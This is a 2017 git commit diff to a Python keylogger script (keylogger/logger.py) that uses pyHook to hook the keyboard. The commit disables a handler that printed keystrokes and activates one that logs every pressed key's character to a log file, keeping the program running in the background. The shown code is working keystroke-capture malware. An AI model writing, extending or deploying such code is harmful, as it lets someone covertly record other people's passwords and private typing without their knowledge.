23dad8ba1a254747c8cf6c6bfb107877a2afa9d9
Meric BAL <MB@Meric-MacBook-Air.local>
2017-03-02 23:05:21 -0800

    Modifications.

--- keylogger/logger.py
+++ keylogger/logger.py
@@ -3,13 +3,13 @@ import pyHook, pythoncom, os, httplib, getpass, shutil, sys, logging
 
 # way 1 for external server
 
-def on_keyboard_event(key):
-	print key.Ascii
+# def on_keyboard_event(key):
+# 	print key.Ascii
 
-hook_manager = pyHook.HookManager() # new hook manager
-hook_manager.KeyDown = on_keyboard_event # tells what to do when user press any key
-hook_manager.HookKeyboard() # tells the program to keep hooking the keyboard
-pythoncom.PumpMessages() # keep program running in background
+# hook_manager = pyHook.HookManager() # new hook manager
+# hook_manager.KeyDown = on_keyboard_event # tells what to do when user press any key
+# hook_manager.HookKeyboard() # tells the program to keep hooking the keyboard
+# pythoncom.PumpMessages() # keep program running in background
 
 
 # way 2 for internal saving 
@@ -22,4 +22,7 @@ def on_keyboard_event(key):
 	logging.log(10, chr(key.Ascii))
 	return True
 
-	
+hook_manager = pyHook.HookManager() # new hook manager
+hook_manager.KeyDown = on_keyboard_event # tells what to do when user press any key
+hook_manager.HookKeyboard() # tells the program to keep hooking the keyboard
+pythoncom.PumpMessages() # keep program running in background
